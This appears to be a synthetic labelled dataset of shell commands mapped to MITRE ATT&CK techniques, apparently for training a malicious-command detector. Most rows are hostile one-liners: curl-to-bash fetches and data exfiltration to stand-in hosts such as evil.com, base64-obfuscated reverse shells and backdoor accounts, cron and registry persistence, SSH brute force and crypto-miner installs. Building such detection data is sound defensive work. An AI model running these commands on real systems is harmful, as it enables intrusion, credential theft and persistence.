medusa  -h  10.0.0.1  -u  root  -P  /tmp/passwords.txt  -M  ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1496_Resource_Hijacking'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
nohup who &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
find / -writable -type d 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
arp-scan --localnet && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nohup arp -a &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
time ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
sudo nmap --script=vuln 10.0.0.1 ; > /dev/null 2>&1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.0, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap --script=vuln 10.0.0.1 && sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""python3 -c ""import os; os.system('id')""""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe | > /dev/null 2>&1 &,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0.2, 0.48, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""ssh -L 8080:internal:80 user@jump.host""","[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
nohup cat /etc/resolv.conf &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo  'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA4MA=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup ip addr show &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
sudo echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlciB8ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -name 'id_rsa' 2>/dev/null | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ifconfig -a ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net user /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
"sudo python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
ssh  -i  ~/.ssh/stolen_key  root@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'dXNlcm1vZCAtYUcgc3VkbyBjb21wcm9taXNlZF91c2VyIHwgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
arp -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
ssh admin@localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1078_Valid_Accounts'],synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive && history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bm1hcCAtQSAtVDQgMTkyLjE2OC4xLjAvMjQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'YWRkdXNlciAtLXNoZWxsIC9iaW4vYmFzaCAtLWRpc2FibGVkLXBhc3N3b3JkIGJhY2tkb29yICYmID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""Get-LocalGroupMember -Group Administrators""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
echo 'bGRhcHNlYXJjaCAteCAtYiAnZGM9ZG9tYWluLGRjPWNvbScgJyhvYmplY3RDbGFzcz1wZXJzb24pJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup ln -s /tmp/backdoor.sh /etc/cron.d/system-update &,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1053_Scheduled_Task'],synthetic
arp -a && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bGFzdCAtbiAxMCB8IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
arp -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe | echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1070_Indicator_Removal'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
fping  -a  -g  192.168.1.0/24  2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
cat /etc/resolv.conf,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1496_Resource_Hijacking'],synthetic
"bash -c ""echo 'Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9uYy5leGUgbmMuZXhl' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'c3UgLSBhZG1pbg==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
time hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1110_Brute_Force'],synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
ssh admin@localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1078_Valid_Accounts'],synthetic
git  clone  https://github.com/user/repo.git,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup ./pwnkit && echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in ; chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
Get-LocalGroupMember -Group Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
"bash -c ""find / -name '*.conf' -readable 2>/dev/null | head -20""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1110_Brute_Force'],synthetic
time echo 'd21pZXhlYy5weSBkb21haW4vYWRtaW46cGFzc0AxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgc3NoOi8vMTAuMC4wLjEgfCBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time route -n,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
"time php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
arp-scan --localnet | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.2, 0.24, 1, 1]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
time echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers | chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 1]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
"sudo ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1087_Account_Discovery'],synthetic
"time python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1110_Brute_Force'],synthetic
nohup echo 'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3Jz' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
nmap -A -T4 192.168.1.0/24 | echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup  ./xmrig  --url  stratum+tcp://pool.minexmr.com:443  --user  wallet  &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
time nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & && sleep 1,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
hostnamectl ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -""","[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1496_Resource_Hijacking'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo echo 'aXAgbmVpZ2ggc2hvdyB8IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ls -la /root /etc /var/www && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y3VybCAtWCBQT1NUIGh0dHA6Ly9ldmlsLmNvbS9jb2xsZWN0IC1kIEAvZXRjL3NoYWRvdyA7ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLw==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
"bash -c ""who ; > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.0, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh | > /dev/null 2>&1""","[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.6, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""usermod -aG sudo compromised_user""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 && sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
time echo 'dw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost && echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.68, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000 ; chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.0, 0.32, 1, 1]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo getent passwd | grep -v nologin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1087_Account_Discovery'],synthetic
